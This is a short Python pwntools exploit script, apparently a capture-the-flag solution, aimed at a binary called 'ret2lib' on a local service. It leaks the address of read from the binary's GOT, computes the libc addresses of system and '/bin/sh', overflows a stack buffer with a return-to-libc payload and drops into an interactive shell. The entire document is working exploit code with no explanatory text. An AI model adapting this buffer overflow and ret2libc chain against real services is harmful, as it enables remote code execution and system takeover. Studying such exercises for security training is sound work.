from pwn import *
import struct
bin = ELF('ret2lib')
libc = ELF('libc.so')
host="127.0.0.1"
port=8888
cn=remote(host,port)
cn.recv()
cn.sendline(str(bin.got['read']))
p_read = int(cn.readuntil('\n').strip()[-10:],16)
p_system = p_read - libc.symbols['read'] + libc.symbols['system']
pbinsh = p_read - libc.symbols['read'] + libc.search('/bin/sh').next()
cn.recvuntil('for me :')
pay = 'a'*0x38 + 'bbbb'
pay += p32(p_system) + 'bbbb' + p32(pbinsh)
cn.sendline(pay)
cn.interactive()
